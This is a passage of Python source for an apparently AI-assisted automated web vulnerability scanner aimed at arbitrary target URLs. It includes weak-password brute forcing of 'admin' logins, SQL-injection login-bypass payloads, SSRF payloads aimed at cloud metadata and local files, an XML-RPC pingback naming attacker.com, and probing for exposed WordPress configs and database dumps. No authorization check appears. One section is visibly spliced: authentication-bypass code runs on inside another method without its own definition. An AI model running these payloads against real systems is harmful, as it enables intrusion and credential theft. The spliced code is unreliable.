                            'description': f'Sensitive file exposed: {file_path}'
                        }
                        print(f"      🚨 Sensitive file exposed: {file_path}")
                        
            except Exception:
                continue

    async def _test_vulnerable_components(self):
        """Test for vulnerable and outdated components"""
        print("    📦 Testing for vulnerable components...")
        
        # Check for version disclosure in common frameworks
        version_patterns = {
            'WordPress': [
                r'wp-includes/version\.php',
                r'readme\.html',
                r'wp-admin/about\.php'
            ],
            'Drupal': [
                r'/CHANGELOG\.txt',
                r'/core/CHANGELOG\.txt'
            ],
            'Joomla': [
                r'/administrator/manifests/files/joomla\.xml'
            ]
        }
        
        for component, paths in version_patterns.items():
            for path in paths:
                test_url = urljoin(self.target_url, path)
                try:
                    response = await asyncio.to_thread(
                        self.session.get, test_url, timeout=5
                    )
                    
                    if response.status_code == 200:
                        # Extract version information
                        version_match = re.search(r'version[:\s]+([0-9.]+)', 
                                                response.text, re.IGNORECASE)
                        
                        if version_match:
                            version = version_match.group(1)
                            print(f"      📋 {component} version detected: {version}")
                            
                            # Check against known vulnerable versions (simplified)
                            if self._is_vulnerable_version(component, version):
                                vuln_id = f"vulnerable_component_{int(time.time())}"
                                self.discovered_assets['vulnerabilities'][vuln_id] = {
                                    'type': 'vulnerable_component',
                                    'severity': 'high',
                                    'component': component,
                                    'version': version,
                                    'vulnerable_url': test_url,
                                    'description': f'Vulnerable {component} version: {version}'
                                }
                                
                except Exception:
                    continue

    def _is_vulnerable_version(self, component, version):
        """Check if a component version is known to be vulnerable (simplified)"""
        # This is a simplified check - in practice, you'd use a vulnerability database
        try:
            version_parts = [int(x) for x in version.split('.')]
            
            if component == 'WordPress':
                # WordPress versions before 5.0 have known vulnerabilities
                return version_parts[0] < 5
            elif component == 'Drupal':
                # Drupal versions before 8.0 have known vulnerabilities
                return version_parts[0] < 8
            elif component == 'Joomla':
                # Joomla versions before 3.9 have known vulnerabilities
                return version_parts[0] < 3 or (version_parts[0] == 3 and version_parts[1] < 9)
                
        except (ValueError, IndexError):
            pass
            
        return False

    async def _test_auth_failures(self):
        """Test for identification and authentication failures"""
        print("    🔑 Testing authentication failures...")
        
        # Test for weak password policies
        await self._test_weak_passwords()
        
        # Test for session management issues
        await self._test_session_management()
        
        # Test for account enumeration
        await self._test_account_enumeration()

    async def _test_weak_passwords(self):
        """Test for weak password policies"""
        # Common weak passwords
        weak_passwords = [
            'admin', 'password', '123456', 'admin123', 'root',
            'test', 'guest', 'user', 'demo', 'password123'
        ]
        
        # Look for login forms
        for form_id, form_data in self.discovered_assets.get('forms', {}).items():
            form_url = form_data.get('url', self.target_url)
            
            # Check if this looks like a login form
            has_password = any(inp.get('type') == 'password' 
                             for inp in form_data.get('inputs', []))
            
            if has_password:
                print(f"      🔐 Testing weak passwords on login form: {form_url}")
                await self._test_login_form_weak_passwords(form_url, weak_passwords[:5])

    async def _test_login_form_weak_passwords(self, form_url, passwords):
        """Test login form with weak passwords"""
        try:
            self.driver.get(form_url)
            await asyncio.sleep(2)
            
            for password in passwords:
                try:
                    # Find username and password fields
                    username_field = self.driver.find_element(By.CSS_SELECTOR, 
                        "input[type='text'], input[name*='user'], input[name*='login'], input[name*='email']")
                    password_field = self.driver.find_element(By.CSS_SELECTOR, 
                        "input[type='password']")
                    
                    # Try common combinations
                    username_field.clear()
                    username_field.send_keys('admin')
                    
                    password_field.clear()
                    password_field.send_keys(password)
                    
                    # Submit form
                    submit_button = self.driver.find_element(By.CSS_SELECTOR, 
                        "input[type='submit'], button[type='submit'], button")
                    submit_button.click()
                    
                    await asyncio.sleep(3)
                    
                    # Check if login was successful
                    current_url = self.driver.current_url
                    page_source = self.driver.page_source.lower()
                    
                    if ('dashboard' in current_url or 'admin' in current_url or
                        'welcome' in page_source or 'logout' in page_source):
                        
                        vuln_id = f"weak_password_{int(time.time())}"
                        self.discovered_assets['vulnerabilities'][vuln_id] = {
                            'type': 'weak_credentials',
                            'severity': 'critical',
                            'username': 'admin',
                            'password': password,
                            'vulnerable_url': form_url,
                            'description': f'Weak credentials found: admin/{password}'
                        }
                        print(f"        🚨 Weak credentials found: admin/{password}")
                        return
                    
                    # Go back for next attempt
                    self.driver.get(form_url)
                    await asyncio.sleep(2)
                    
                except Exception:
                    continue
                    
        except Exception as e:
            print(f"        ❌ Error testing weak passwords: {e}")

    async def _test_session_management(self):
        """Test session management security"""
        print("      🍪 Testing session management...")
        
        try:
            # Check cookies for security flags
            self.driver.get(self.target_url)
            await asyncio.sleep(2)
            
            cookies = self.driver.get_cookies()
            
            for cookie in cookies:
                cookie_name = cookie.get('name', '')
                
                # Check for session cookies
                if any(term in cookie_name.lower() for term in ['session', 'sess', 'jsession', 'phpsessid']):
                    security_issues = []
                    
                    if not cookie.get('secure', False):
                        security_issues.append('missing_secure_flag')
                    
                    if not cookie.get('httpOnly', False):
                        security_issues.append('missing_httponly_flag')
                    
                    if cookie.get('sameSite') not in ['Strict', 'Lax']:
                        security_issues.append('missing_samesite_flag')
                    
                    if security_issues:
                        vuln_id = f"session_cookie_{int(time.time())}"
                        self.discovered_assets['vulnerabilities'][vuln_id] = {
                            'type': 'insecure_session_cookie',
                            'severity': 'medium',
                            'cookie_name': cookie_name,
                            'issues': security_issues,
                            'vulnerable_url': self.target_url,
                            'description': f'Insecure session cookie: {cookie_name}'
                        }
                        print(f"        ⚠️  Insecure session cookie: {cookie_name}")
                        
        except Exception as e:
            print(f"        ❌ Error testing session management: {e}")

    async def _test_account_enumeration(self):
        """Test for user account enumeration"""
        print("      👥 Testing account enumeration...")
        
        # Test common usernames
        common_usernames = ['admin', 'administrator', 'root', 'test', 'user', 'guest']
        
        # Look for login forms
        for form_id, form_data in self.discovered_assets.get('forms', {}).items():
            form_url = form_data.get('url', self.target_url)
            
            if any(inp.get('type') == 'password' for inp in form_data.get('inputs', [])):
                await self._test_username_enumeration(form_url, common_usernames[:3])

    async def _test_username_enumeration(self, form_url, usernames):
        """Test for username enumeration on login form"""
        try:
            responses = {}
            
            for username in usernames:
                try:
                    self.driver.get(form_url)
                    await asyncio.sleep(2)
                    
                    # Find username field
                    username_field = self.driver.find_element(By.CSS_SELECTOR, 
                        "input[type='text'], input[name*='user'], input[name*='login']")
                    password_field = self.driver.find_element(By.CSS_SELECTOR, 
                        "input[type='password']")
                    
                    username_field.clear()
                    username_field.send_keys(username)
                    password_field.clear()
                    password_field.send_keys('invalidpassword123')
                    
                    submit_button = self.driver.find_element(By.CSS_SELECTOR, 
                        "input[type='submit'], button[type='submit'], button")
                    submit_button.click()
                    
                    await asyncio.sleep(2)
                    
                    # Analyze response
                    page_source = self.driver.page_source
                    response_length = len(page_source)
                    
                    responses[username] = {
                        'length': response_length,
                        'content': page_source.lower()
                    }
                    
                except Exception:
                    continue
            
            # Analyze responses for differences
            if len(responses) > 1:
                lengths = [resp['length'] for resp in responses.values()]
                
                # If response lengths vary significantly, might indicate enumeration
                if max(lengths) - min(lengths) > 100:
                    vuln_id = f"user_enumeration_{int(time.time())}"
                    self.discovered_assets['vulnerabilities'][vuln_id] = {
                        'type': 'user_enumeration',
                        'severity': 'medium',
                        'vulnerable_url': form_url,
                        'description': 'User enumeration possible via login form response differences'
                    }
                    print(f"        ⚠️  User enumeration possible")
                    
        except Exception as e:
            print(f"        ❌ Error testing username enumeration: {e}")

    async def _test_integrity_failures(self):
        """Test for software and data integrity failures"""
        print("    🔒 Testing integrity failures...")
        
        # Check for insecure deserialization
        await self._test_insecure_deserialization()
        
        # Check for software supply chain attacks
        await self._test_supply_chain_security()

    async def _test_insecure_deserialization(self):
        """Test for insecure deserialization vulnerabilities"""
        # This would require complex payloads specific to different languages
        # For now, just check for common deserialization endpoints
        deserialization_endpoints = [
            '/api/deserialize', '/deserialize', '/unserialize',
            '/pickle', '/marshal', '/json'
        ]
        
        for endpoint in deserialization_endpoints:
            test_url = urljoin(self.target_url, endpoint)
            try:
                response = await asyncio.to_thread(
                    self.session.get, test_url, timeout=5
                )
                
                if response.status_code == 200:
                    print(f"      ⚠️  Potential deserialization endpoint: {endpoint}")
                    
            except Exception:
                continue

    async def _test_supply_chain_security(self):
        """Test for supply chain security issues"""
        # Check for outdated JavaScript libraries
        page_source = self.driver.page_source
        
        # Look for common vulnerable libraries
        vulnerable_patterns = [
            r'jquery[/\-\.]1\.[0-8]',  # Old jQuery versions
            r'angular[/\-\.]1\.[0-5]',  # Old Angular versions
            r'bootstrap[/\-\.]2\.',     # Old Bootstrap versions
        ]
        
        for pattern in vulnerable_patterns:
            if re.search(pattern, page_source, re.IGNORECASE):
                vuln_id = f"vulnerable_library_{int(time.time())}"
                self.discovered_assets['vulnerabilities'][vuln_id] = {
                    'type': 'vulnerable_javascript_library',
                    'severity': 'medium',
                    'pattern': pattern,
                    'vulnerable_url': self.target_url,
                    'description': f'Potentially vulnerable JavaScript library detected'
                }
                print(f"      ⚠️  Vulnerable JavaScript library detected")

    async def _test_logging_monitoring(self):
        """Test for security logging and monitoring failures"""
        print("    📊 Testing logging and monitoring...")
        
        # This is more of an informational check
        # Look for exposed log files
        log_files = [
            '/access.log', '/error.log', '/debug.log', '/app.log',
            '/logs/access.log', '/logs/error.log', '/var/log/apache2/access.log'
        ]
        
        for log_file in log_files:
            test_url = urljoin(self.target_url, log_file)
            try:
                response = await asyncio.to_thread(
                    self.session.get, test_url, timeout=5
                )
                
                if response.status_code == 200 and len(response.text) > 100:
                    vuln_id = f"exposed_logs_{int(time.time())}"
                    self.discovered_assets['vulnerabilities'][vuln_id] = {
                        'type': 'exposed_log_files',
                        'severity': 'medium',
                        'log_file': log_file,
                        'vulnerable_url': test_url,
                        'description': f'Log file exposed: {log_file}'
                    }
                    print(f"      ⚠️  Log file exposed: {log_file}")
                    
            except Exception:
                continue

    async def _test_ssrf_comprehensive(self):
        """Comprehensive SSRF testing"""
        print("    🔄 Comprehensive SSRF testing...")
        
        # Enhanced SSRF payloads
        ssrf_payloads = [
            'http://localhost:80',
            'http://127.0.0.1:22',
            'http://127.0.0.1:3306',
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'file:///etc/passwd',
            'file:///proc/version',
            'gopher://127.0.0.1:3306',
            'dict://127.0.0.1:11211/stat',
            'ldap://127.0.0.1:389',
            'sftp://127.0.0.1:22'
        ]
        
        # Test all discovered parameters for SSRF
        for url, params in self.exploration_tree.get('parameters_discovered', {}).items():
            for param_name in params.keys():
                # Parameters that commonly lead to SSRF
                if any(term in param_name.lower() for term in 
                      ['url', 'link', 'uri', 'redirect', 'callback', 'webhook', 'proxy', 'fetch']):
                    
                    for payload in ssrf_payloads[:5]:  # Test first 5 payloads
                        await self._test_ssrf_parameter(url, param_name, payload)

    async def _test_insecure_design(self):
        """Test for insecure design patterns"""
        print("    🏗️  Testing insecure design patterns...")
        
        # Check for information disclosure in error messages
        error_inducing_params = ['../../../', '"><script>', "' OR 1=1--", '${7*7}']
        
        for url, params in self.exploration_tree.get('parameters_discovered', {}).items():
            for param_name in list(params.keys())[:3]:  # Test first 3 parameters
                for error_payload in error_inducing_params[:2]:
                    try:
                        parsed_url = urlparse(url)
                        test_params = parse_qs(parsed_url.query)
                        test_params[param_name] = [error_payload]
                        
                        new_query = urlencode(test_params, doseq=True)
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                        
                        response = await asyncio.to_thread(
                            self.session.get, test_url, timeout=5
                        )
                        
                        # Check for detailed error messages
                        error_indicators = [
                            'stack trace', 'exception', 'error on line',
                            'mysql_', 'postgresql', 'oracle error',
                            'warning:', 'fatal error', 'parse error'
                        ]
                        
                        response_lower = response.text.lower()
                        
                        if any(indicator in response_lower for indicator in error_indicators):
                            vuln_id = f"verbose_errors_{int(time.time())}"
                            self.discovered_assets['vulnerabilities'][vuln_id] = {
                                'type': 'verbose_error_messages',
                                'severity': 'low',
                                'parameter': param_name,
                                'vulnerable_url': test_url,
                                'description': 'Verbose error messages reveal system information'
                            }
                            print(f"      ⚠️  Verbose error messages detected")
                            break
                            
                    except Exception:
                        continue
        print("  🔐 Authentication Bypass Testing:")
        
        # Look for login forms
        login_indicators = ['login', 'signin', 'authenticate', 'password']
        page_source = self.driver.page_source.lower()
        
        if any(indicator in page_source for indicator in login_indicators):
            print("    🔍 Login functionality detected")
            
            # Test SQL injection in login
            sql_payloads = ["admin'--", "' OR '1'='1'--", "admin'/*"]
            
            forms = self.driver.find_elements(By.TAG_NAME, "form")
            for form in forms:
                try:
                    username_fields = form.find_elements(By.CSS_SELECTOR, "input[type='text'], input[type='email'], input[name*='user'], input[name*='email']")
                    password_fields = form.find_elements(By.CSS_SELECTOR, "input[type='password']")
                    
                    if username_fields and password_fields:
                        for payload in sql_payloads:
                            username_fields[0].clear()
                            username_fields[0].send_keys(payload)
                            password_fields[0].clear()
                            password_fields[0].send_keys("password")
                            
                            # Submit
                            submit_buttons = form.find_elements(By.CSS_SELECTOR, "input[type='submit'], button[type='submit'], button")
                            if submit_buttons:
                                submit_buttons[0].click()
                                await asyncio.sleep(2)
                                
                                # Check if bypass worked
                                new_url = self.driver.current_url
                                if new_url != self.target_url and 'login' not in new_url.lower():
                                    print(f"      🚨 Potential auth bypass: {payload}")
                                    break
                                    
                                self.driver.back()
                                await asyncio.sleep(1)
                                
                except Exception:
                    continue

    async def _test_business_logic(self):
        """Test for business logic vulnerabilities"""
        print("  💼 Business Logic Testing:")
        
        # Test for price manipulation (if e-commerce detected)
        if any(word in self.driver.page_source.lower() for word in ['cart', 'price', 'buy', 'purchase', 'checkout']):
            print("    🛒 E-commerce functionality detected")
            
            # Look for hidden price fields
            hidden_inputs = self.driver.find_elements(By.CSS_SELECTOR, "input[type='hidden']")
            for inp in hidden_inputs:
                name = inp.get_attribute('name')
                value = inp.get_attribute('value')
                
                if name and any(word in name.lower() for word in ['price', 'cost', 'amount', 'total']):
                    print(f"      ⚠️ Hidden price field found: {name} = {value}")

    async def _test_wordpress_vulnerabilities(self):
        """Test WordPress-specific vulnerabilities"""
        print("  🔍 WordPress-Specific Vulnerability Testing:")
        
        # Only run if WordPress was detected
        if 'WordPress' not in self.discovered_assets.get('technologies', set()):
            print("    ❌ WordPress not detected, skipping WP-specific tests")
            return
        
        wp_data = self.discovered_assets.get('wordpress', {})
        
        # Test 1: XML-RPC Amplification Attack
        await self._test_xmlrpc_attacks()
        
        # Test 2: WordPress REST API Exploitation
        await self._test_wp_rest_api()
        
        # Test 3: Plugin Enumeration and Testing
        await self._test_wp_plugins()
        
        # Test 4: Theme Vulnerabilities
        await self._test_wp_themes()
        
        # Test 5: WordPress-specific file access
        await self._test_wp_file_access()
        
        # Test 6: WordPress user enumeration
        await self._test_wp_user_enumeration()

    async def _test_xmlrpc_attacks(self):
        """Test XML-RPC vulnerabilities"""
        print("    🔧 Testing XML-RPC Interface...")
        
        xmlrpc_url = f"{self.target_url.rstrip('/')}/xmlrpc.php"
        
        try:
            # Test if XML-RPC is enabled
            response = await asyncio.to_thread(
                self.session.post, xmlrpc_url,
                headers={'Content-Type': 'text/xml'},
                data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                timeout=10
            )
            
            if response.status_code == 200 and 'methodResponse' in response.text:
                print("      🚨 XML-RPC interface is active")
                
                # Test pingback functionality
                pingback_payload = f'''<?xml version="1.0"?>
                <methodCall>
                    <methodName>pingback.ping</methodName>
                    <params>
                        <param><value><string>http://attacker.com/</string></value></param>
                        <param><value><string>{self.target_url}</string></value></param>
                    </params>
                </methodCall>'''
                
                pingback_response = await asyncio.to_thread(
                    self.session.post, xmlrpc_url,
                    headers={'Content-Type': 'text/xml'},
                    data=pingback_payload,
                    timeout=5
                )
                
                if 'pingback' in pingback_response.text.lower():
                    print("      ⚠️ Pingback functionality may be exploitable")
                    self.discovered_assets['vulnerabilities']['xmlrpc_pingback'] = {
                        'url': xmlrpc_url,
                        'description': 'XML-RPC pingback functionality exposed',
                        'severity': 'medium'
                    }
                
        except Exception as e:
            print(f"      ❌ XML-RPC test failed: {str(e)[:50]}")

    async def _test_wp_rest_api(self):
        """Test WordPress REST API vulnerabilities"""
        print("    🔧 Testing WordPress REST API...")
        
        rest_endpoints = [
            'wp-json/', 'wp-json/wp/v2/', 'wp-json/wp/v2/users/',
            'wp-json/wp/v2/posts/', 'wp-json/wp/v2/pages/',
            '?rest_route=/', '?rest_route=/wp/v2/users'
        ]
        
        for endpoint in rest_endpoints[:4]:  # Test first 4
            try:
                api_url = f"{self.target_url.rstrip('/')}/{endpoint.lstrip('/')}"
                response = await asyncio.to_thread(
                    self.session.get, api_url, timeout=5
                )
                
                if response.status_code == 200:
                    try:
                        json_data = response.json()
                        if isinstance(json_data, list) and len(json_data) > 0:
                            print(f"      ⚠️ REST API endpoint exposed: {endpoint}")
                            
                            # Check for user information exposure
                            if 'users' in endpoint and json_data:
                                user_info = json_data[0] if isinstance(json_data, list) else json_data
                                if 'slug' in str(user_info) or 'name' in str(user_info):
                                    print("      🚨 User information exposed via REST API")
                                    self.discovered_assets['vulnerabilities']['rest_api_users'] = {
                                        'url': api_url,
                                        'description': 'WordPress REST API exposes user information',
                                        'severity': 'medium'
                                    }
                    except:
                        pass
                        
            except Exception:
                continue

    async def _test_wp_plugins(self):
        """Test discovered WordPress plugins for vulnerabilities"""
        print("    🔧 Testing WordPress Plugins...")
        
        wp_data = self.discovered_assets.get('wordpress', {})
        plugins = wp_data.get('plugins', [])
        
        if not plugins:
            print("      ❌ No plugins detected to test")
            return
        
        for plugin in plugins[:3]:  # Test first 3 plugins
            plugin_slug = plugin['slug']
            print(f"      🔍 Testing plugin: {plugin_slug}")
            
            # Test common plugin files
            plugin_files = [
                f"wp-content/plugins/{plugin_slug}/readme.txt",
                f"wp-content/plugins/{plugin_slug}/changelog.txt",
                f"wp-content/plugins/{plugin_slug}/admin.php",
                f"wp-content/plugins/{plugin_slug}/ajax.php"
            ]
            
            for plugin_file in plugin_files:
                try:
                    file_url = f"{self.target_url.rstrip('/')}/{plugin_file}"
                    response = await asyncio.to_thread(
                        self.session.get, file_url, timeout=3
                    )
                    
                    if response.status_code == 200:
                        # Check for sensitive information disclosure
                        if 'version' in response.text.lower() or 'changelog' in response.text.lower():
                            print(f"        📄 Plugin file accessible: {plugin_file}")
                
                except Exception:
                    continue

    async def _test_wp_themes(self):
        """Test WordPress themes for vulnerabilities"""
        print("    🔧 Testing WordPress Themes...")
        
        wp_data = self.discovered_assets.get('wordpress', {})
        themes = wp_data.get('themes', [])
        
        if not themes:
            # Try to detect active theme
            try:
                response = await asyncio.to_thread(
                    self.session.get, self.target_url, timeout=5
                )
                
                theme_match = re.search(r'/wp-content/themes/([^/]+)/', response.text)
                if theme_match:
                    themes = [{'slug': theme_match.group(1), 'name': theme_match.group(1)}]
            except Exception:
                pass
        
        for theme in themes[:2]:  # Test first 2 themes
            theme_slug = theme['slug']
            print(f"      🔍 Testing theme: {theme_slug}")
            
            # Test theme files for LFI
            theme_files = [
                f"wp-content/themes/{theme_slug}/functions.php",
                f"wp-content/themes/{theme_slug}/style.css",
                f"wp-content/themes/{theme_slug}/404.php"
            ]
            
            for theme_file in theme_files:
                try:
                    file_url = f"{self.target_url.rstrip('/')}/{theme_file}"
                    response = await asyncio.to_thread(
                        self.session.get, file_url, timeout=3
                    )
                    
                    if response.status_code == 200 and len(response.text) > 100:
                        print(f"        📄 Theme file accessible: {theme_file}")
                        
                        # Check for potential code execution
                        if 'eval(' in response.text or '<?php' in response.text:
                            print(f"        ⚠️ PHP code detected in theme file")
                            
                except Exception:
                    continue

    async def _test_wp_file_access(self):
        """Test WordPress-specific file access vulnerabilities"""
        print("    🔧 Testing WordPress File Access...")
        
        # WordPress configuration and backup files
        sensitive_files = [
            'wp-config.php', 'wp-config.php.bak', 'wp-config.txt',
            'wp-config.php~', '.wp-config.php.swp', 'wp-config.php.save',
            'backup-db.sql', 'database.sql', 'wp-content/debug.log',
            '.htaccess', 'web.config'
        ]
        
        for sensitive_file in sensitive_files:
            try:
                file_url = f"{self.target_url.rstrip('/')}/{sensitive_file}"
                response = await asyncio.to_thread(
                    self.session.get, file_url, timeout=3
                )
                
                if response.status_code == 200:
                    content_lower = response.text.lower()
                    
                    # Check for WordPress configuration exposure
                    if 'db_name' in content_lower or 'db_user' in content_lower:
                        print(f"      🚨 WordPress config exposed: {sensitive_file}")
                        self.discovered_assets['vulnerabilities']['config_exposure'] = {
                            'file': sensitive_file,
                            'url': file_url,
                            'description': 'WordPress configuration file exposed',
                            'severity': 'critical'
                        }
                    
                    # Check for database dumps
                    elif 'create table' in content_lower or 'insert into' in content_lower:
                        print(f"      🚨 Database dump found: {sensitive_file}")
                        self.discovered_assets['vulnerabilities']['database_dump'] = {
                            'file': sensitive_file,
                            'url': file_url,
                            'description': 'Database dump file accessible',
                            'severity': 'high'
                        }
                    
                    elif sensitive_file == 'wp-content/debug.log' and len(response.text) > 100:
                        print(f"      ⚠️ Debug log accessible: {sensitive_file}")
                        
            except Exception:
                continue

    async def _test_wp_user_enumeration(self):
        """Test WordPress user enumeration vulnerabilities"""
        print("    🔧 Testing WordPress User Enumeration...")
        
        # Method 1: Author parameter enumeration
        try:
            for user_id in range(1, 6):  # Test user IDs 1-5
                user_url = f"{self.target_url}?author={user_id}"
                response = await asyncio.to_thread(
                    self.session.get, user_url, timeout=3
                )
                
                if response.status_code == 200:
                    # Check if redirected to author page
                    if '/author/' in response.url or 'author' in response.text.lower():
                        print(f"      ⚠️ User enumeration possible via ?author={user_id}")
                        self.discovered_assets['vulnerabilities']['user_enumeration'] = {
                            'method': 'author_parameter',
                            'description': 'WordPress user enumeration via author parameter',
                            'severity': 'low'
                        }
                        break
        except Exception:
            pass
        
        # Method 2: REST API user enumeration (already tested above)
        
        # Method 3: Login error messages
        try:
            login_url = f"{self.target_url.rstrip('/')}/wp-login.php"
            login_data = {
                'log': 'nonexistentuser123',
                'pwd': 'wrongpassword',
                'wp-submit': 'Log In'
            }
            
            response = await asyncio.to_thread(
                self.session.post, login_url,
                data=login_data,
                timeout=5
            )
            
            if response.status_code == 200:
                if 'invalid username' in response.text.lower():
                    print("      ⚠️ Username enumeration via login error messages")
                    
        except Exception:
            pass

    async def ai_powered_analysis_summary(self):
        """Phase 4: AI-powered comprehensive analysis"""
        print("🧠 Phase 4: Analysis & Reporting...")
        
        if not self.ai_enabled or not self.ai_model:
            print("  ⚡ Standard analysis completed (AI disabled)")
            # Show basic summary without AI
            vuln_count = len(self.discovered_assets['vulnerabilities'])
            tech_count = len(self.discovered_assets['technologies'])
            pages_count = len(self.discovered_assets['pages'])
            
            print(f"  📊 Summary: {pages_count} pages analyzed, {tech_count} technologies detected, {vuln_count} vulnerabilities found")
            if vuln_count > 0:
                print(f"  🚨 {vuln_count} potential security issues detected - manual review recommended")
            else:
                print("  ✅ No obvious vulnerabilities detected by automated scanning")
            return
        
        # Compile all findings
        findings_summary = {
            'vulnerabilities': self.discovered_assets['vulnerabilities'],
            'technologies': list(self.discovered_assets['technologies']),
            'pages_analyzed': len(self.discovered_assets['pages']),
            'forms_tested': len(self.discovered_assets['forms']),
            'links_discovered': sum(len(links) for links in self.discovered_assets.get('links', {}).values())
        }
        
        try:
            prompt = f"""
            Analyze this comprehensive penetration test results:
            
            Target: {self.target_url}
            
            Findings Summary:
            {json.dumps(findings_summary, indent=2)}
            
            Please provide:
            1. Overall security assessment (1-10 scale)
            2. Critical vulnerabilities found
            3. Prioritized remediation recommendations
            4. Attack vectors that should be tested further
            5. Business impact assessment
            
            Focus on actionable security insights.
            """
            
            response = await asyncio.to_thread(
                self.ai_model.generate_content, prompt
            )
            
            print("  🎯 AI Security Assessment:")
            print("  " + "="*50)
            
            # Use new AIAnalyzer if available, otherwise fall back to old method
            if self.ai_analyzer:
                response = await asyncio.to_thread(
                    self.ai_analyzer.analyze_with_prompt, prompt
                )
                result_text = response.get('response', response.get('analysis', str(response)))
                print(f"  {result_text}")
            else:
                # Fallback to old Gemini method
                response = await asyncio.to_thread(
                    self.ai_model.generate_content, prompt
                )
                print(f"  {response.text}")
            
            print("  " + "="*50)
            
        except Exception as e:
            print(f"  ❌ AI analysis failed: {e}")

    async def realtime_monitor_and_analyze(self, interval=2):
        """Continuously monitor DOM, console logs, network, and provide AI-powered real-time analysis and commentary."""
        if not self.driver:
            print("[RealTime] Browser not initialized.")
            return
        print("[RealTime] Starting real-time DOM, console, network, and AI analysis...")
        last_dom = ""
        seen_console = set()
        seen_network = set()
        # Enable network monitoring via CDP
        try:
            self.driver.execute_cdp_cmd('Network.enable', {})
        except Exception as e:
            print(f"[RealTime] Could not enable network monitoring: {e}")
        try:
            while True:
                event_log = {}
                # 1. Extract visible DOM/content
                dom = self.driver.execute_script("return document.body.innerText || document.body.textContent || '';")
                if dom != last_dom:
                    print("\n[RealTime] DOM/content changed:")
                    print(dom[:500] + ("..." if len(dom) > 500 else ""))
                    event_log['type'] = 'dom_change'
                    event_log['content'] = dom[:2000]
                    last_dom = dom
                    # AI analysis of new content
                    if self.ai_model:
                        ai_result = await self.ai_analyze_page(self.driver.current_url, dom, context="realtime-dom")
                        print("[AI] Analysis:", ai_result.get("analysis", ai_result))
                        print("[AI] Risk Score:", ai_result.get("risk_score", "N/A"))
                        print("[AI] Recommendations:", ai_result.get("recommendations", []))
                        event_log['ai'] = ai_result
                # 2. Fetch and analyze console logs
                try:
                    logs = self.driver.get_log('browser')
                    for entry in logs:
                        key = (entry['timestamp'], entry['message'])
                        if key not in seen_console:
                            print(f"[Console] {entry['level']}: {entry['message']}")
                            event_log['type'] = 'console_log'
                            event_log['console'] = entry
                            seen_console.add(key)
                            # AI can analyze suspicious logs
                            if self.ai_model:
                                ai_result = await self.ai_analyze_page(self.driver.current_url, entry['message'], context="realtime-console")
                                print("[AI] Console Analysis:", ai_result.get("analysis", ai_result))
                                event_log['ai'] = ai_result
                except Exception as e:
                    pass  # Not all drivers support get_log
                # 3. Network activity via CDP
                try:
                    network_events = self.driver.execute_cdp_cmd('Network.getResponseBody', {})
                except Exception:
                    network_events = []
                try:
                    # Get recent network requests
                    requests_cdp = self.driver.execute_cdp_cmd('Network.getRequestPostData', {})
                except Exception:
                    requests_cdp = []
                # (Note: Selenium's CDP support is limited; for full event stream, selenium-wire or direct CDP client is needed)
                # For demonstration, we will log that network monitoring is enabled
                if network_events or requests_cdp:
                    event_log['type'] = 'network_event'
                    event_log['network'] = {'responses': network_events, 'requests': requests_cdp}
                    print("[Network] Network activity detected (see log file for details)")
                    if self.ai_model:
                        ai_result = await self.ai_analyze_page(self.driver.current_url, str(event_log['network']), context="realtime-network")
                        print("[AI] Network Analysis:", ai_result.get("analysis", ai_result))
                        event_log['ai'] = ai_result
                # 4. Structured logging
                if event_log:
                    self.live_log.append(event_log)
                    if self.log_to_file:
                        try:
                            logging.info(json.dumps(event_log))
                        except Exception as e:
                            print(f"[Log] Error writing to file: {e}")
                await asyncio.sleep(interval)
        except KeyboardInterrupt:
            print("[RealTime] Real-time monitoring stopped by user.")
        except Exception as e:
            print(f"[RealTime] Error: {e}")

    # Integrate real-time monitoring into the main crawl/test flow
    async def comprehensive_crawl_and_test(self, target_url):
        self.target_url = target_url
        self.target_domain = urlparse(target_url).netloc
        
        # Initialize comprehensive report
        comprehensive_report = {
            "target": target_url,
            "domain": self.target_domain,
            "scan_start_time": datetime.now().isoformat(),
            "console_output": [],
            "phases": [],
            "discovered_assets": {},
            "vulnerabilities": {},
            "recommendations": [],
            "summary": {}
        }
        
        def capture_print(message):
            """Capture console output to include in report"""
            print(message)
            comprehensive_report["console_output"].append({
                "timestamp": datetime.now().isoformat(),
                "message": str(message)
            })
        
        capture_print(f"🎯 Target: {target_url}")
        capture_print(f"🚀 Starting comprehensive intelligent security testing...")
        
        try:
            await self.setup_advanced_browser()
            
            # Stagehand Enhanced Discovery (if available)
            if self.use_stagehand and self.stagehand_crawler:
                capture_print("\n✨ Phase 0: Stagehand AI-Enhanced Pre-Discovery")
                comprehensive_report["phases"].append({"name": "Stagehand AI Discovery", "start_time": datetime.now().isoformat()})
                await self._stagehand_enhanced_discovery(target_url)
                comprehensive_report["phases"][-1]["end_time"] = datetime.now().isoformat()
                comprehensive_report["phases"][-1]["findings"] = dict(self.discovered_assets)
            
            # Start real-time monitoring in the background
            monitor_task = asyncio.create_task(self.realtime_monitor_and_analyze())
            
            # Phase 1: Advanced Discovery
            capture_print("\n📡 Phase 1: Advanced Discovery")
            comprehensive_report["phases"].append({"name": "Advanced Discovery", "start_time": datetime.now().isoformat()})
            await self.advanced_discovery(target_url)
            comprehensive_report["phases"][-1]["end_time"] = datetime.now().isoformat()
            comprehensive_report["phases"][-1]["findings"] = dict(self.discovered_assets)
            
            # Phase 2: Intelligent Exploration
            capture_print("\n🕷️ Phase 2: Intelligent Exploration")
            comprehensive_report["phases"].append({"name": "Intelligent Exploration", "start_time": datetime.now().isoformat()})
            await self.intelligent_exploration()
            comprehensive_report["phases"][-1]["end_time"] = datetime.now().isoformat()
            comprehensive_report["phases"][-1]["findings"] = dict(self.discovered_assets)
            
            # Phase 3: Vulnerability Testing
            capture_print("\n🔍 Phase 3: Vulnerability Testing")
            comprehensive_report["phases"].append({"name": "Vulnerability Testing", "start_time": datetime.now().isoformat()})
            await self.advanced_vulnerability_testing()
            comprehensive_report["phases"][-1]["end_time"] = datetime.now().isoformat()
            comprehensive_report["phases"][-1]["findings"] = dict(self.discovered_assets)
            
            # Phase 4: Third-party scanner integration
            capture_print("\n🔧 Phase 4: External Scanner Integration")
            comprehensive_report["phases"].append({"name": "External Scanner Integration", "start_time": datetime.now().isoformat()})
            
            # If WordPress detected, run WPScan automatically
            if 'WordPress' in self.discovered_assets.get('technologies', set()):
                capture_print("🔍 WordPress detected - Running WPScan...")
